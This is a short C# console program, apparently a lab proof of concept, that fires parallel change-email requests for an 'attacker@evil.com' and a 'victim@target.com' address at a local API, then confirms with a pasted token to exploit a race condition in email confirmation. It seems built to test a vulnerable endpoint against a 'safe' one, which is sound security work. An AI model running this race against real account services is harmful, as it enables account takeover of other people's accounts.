using System.Net.Http;
using System.Net.Http.Json;
using System.Text.Json;

//const string apiBase = "http://localhost:5024/api/account";
const string apiBase = "http://localhost:5024/api/safe-account";
const int userId = 1;

// Send two requests: attacker → victim, then click the confirmation
await RunRaceAsync();

static async Task RunRaceAsync()
{
   var client = new HttpClient();
   var attackerEmail = "attacker@evil.com";
   var victimEmail = "victim@target.com";

   // Step 1: fire both email changes in parallel
   var taskA = Task.Run(() => SendChangeEmail(attackerEmail));
   await Task.Delay(50); // short gap to widen race window
   var taskB = Task.Run(() => SendChangeEmail(victimEmail));
   await Task.WhenAll(taskA, taskB);

   Console.WriteLine("Sent both change-email requests.");

   // Step 2: wait for token (console output), ask user to paste it
   Console.Write("Paste token from console: ");
   var token = Console.ReadLine();
   Console.Write("Paste email from console: ");
   var confirmedEmail = Console.ReadLine();

   // Step 3: send confirmation
   var confirmUrl = $"{apiBase}/confirm-email?token={token}&email={Uri.EscapeDataString(confirmedEmail!)}";
   var result = await client.GetAsync(confirmUrl);
   Console.WriteLine($"Confirmation response: {result.StatusCode}");

   // Step 4: check final email
   var user = await client.GetFromJsonAsync<User>($"{apiBase}/get-user/{userId}");
   Console.WriteLine($"✅ Final email: {user?.Email}");
}

static async Task SendChangeEmail(string email)
{
   var client = new HttpClient();
   var data = new { userId = 1, newEmail = email };
   var res = await client.PostAsJsonAsync("http://localhost:5024/api/safe-account/change-email", data);
   Console.WriteLine($"→ Sent: {email} ({res.StatusCode})");
}

record User(int Id, string Email);
